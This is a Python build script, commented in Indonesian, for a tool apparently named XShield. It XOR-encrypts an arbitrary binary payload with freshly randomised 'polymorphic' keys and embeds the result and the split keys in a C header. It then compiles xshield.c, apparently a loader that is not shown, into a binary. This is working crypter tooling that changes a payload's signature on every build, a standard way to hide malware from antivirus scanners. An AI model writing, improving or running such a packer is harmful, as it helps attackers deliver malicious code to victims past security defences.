#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import random

# =========================
# WARNA TERMINAL
# =========================
class color:
    R = '\033[1;31m'
    G = '\033[1;32m'
    Y = '\033[1;33m'
    C = '\033[1;36m'
    N = '\033[0m'

# =========================
# PASTIKAN DI /tools
# =========================
if os.path.basename(os.getcwd()) != "tools":
    print(f"{color.R}[ERROR]{color.N} Jalankan dari folder XShield/tools")
    sys.exit(1)

SCRIPT_DIR = os.getcwd()
TARGET_DIR = os.path.abspath(os.path.join(SCRIPT_DIR, ".."))

# =========================
# CEK PYTHON
# =========================
print(f"{color.G}[INFO]{color.N} Python {sys.version_info[0]} terdeteksi.")

# =========================
# CEK COMPILER
# =========================
def check_command(cmd):
    return subprocess.call(f"command -v {cmd}", shell=True,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0

if check_command("clang"):
    CC = "clang"
elif check_command("gclang"):
    CC = "gclang"
else:
    print(f"{color.R}[ERROR]{color.N} Clang tidak ditemukan!")
    sys.exit(1)

print(f"{color.G}[INFO]{color.N} Compiler: {CC}")

# =========================
# INPUT FILE PAYLOAD
# =========================
if len(sys.argv) > 1:
    payload_input = sys.argv[1]
else:
    payload_input = "payload.bin"

payload_path = os.path.join(SCRIPT_DIR, payload_input)
payload_header = os.path.join(SCRIPT_DIR, "payload.h")

if not os.path.isfile(payload_path):
    print(f"{color.R}[ERROR]{color.N} File tidak ditemukan: {payload_input}")
    sys.exit(1)

# =========================
# BACA FILE PAYLOAD
# =========================
with open(payload_path, "rb") as f:
    data = f.read()

print(f"{color.C}[INFO]{color.N} Ukuran payload: {len(data)} bytes")

# =========================
# GENERATE KEY ACAK (POLYMORPHIC)
# =========================
k1 = [random.randint(1,255) for _ in range(4)]
k2 = [random.randint(1,255) for _ in range(4)]

# XOR ENKRIP PAYLOAD
enc = bytearray()
for i, b in enumerate(data):
    k = k1[i % 4] ^ k2[i % 4]
    enc.append(b ^ k)

array_data = ", ".join(f"0x{b:02x}" for b in enc)
k1_str = ", ".join(f"0x{x:02x}" for x in k1)
k2_str = ", ".join(f"0x{x:02x}" for x in k2)

# =========================
# TULIS payload.h
# =========================
with open(payload_header, "w") as f:
    f.write(f"""#ifndef PAYLOAD_H
#define PAYLOAD_H

unsigned char payload[] = {{
{array_data}
}};

unsigned int payload_len = {len(enc)};

unsigned char k_part1[4] = {{ {k1_str} }};
unsigned char k_part2[4] = {{ {k2_str} }};

#endif
""")

print(f"{color.G}[INFO]{color.N} payload.h berhasil dibuat (terenkripsi)")

# =========================
# COMPILE xshield.c
# =========================
c_file = os.path.join(SCRIPT_DIR, "xshield.c")
binary_file = os.path.join(TARGET_DIR, "xshield")

if os.path.isfile(c_file):
    print(f"{color.C}[INFO]{color.N} Compile xshield.c ...")
    os.system(f"{CC} {c_file} -o {binary_file}")
    print(f"{color.G}[INFO]{color.N} Binary jadi: {binary_file}")
else:
    print(f"{color.Y}[WARN]{color.N} xshield.c tidak ditemukan")

print(f"{color.G}[INFO]{color.N} Semua proses selesai.")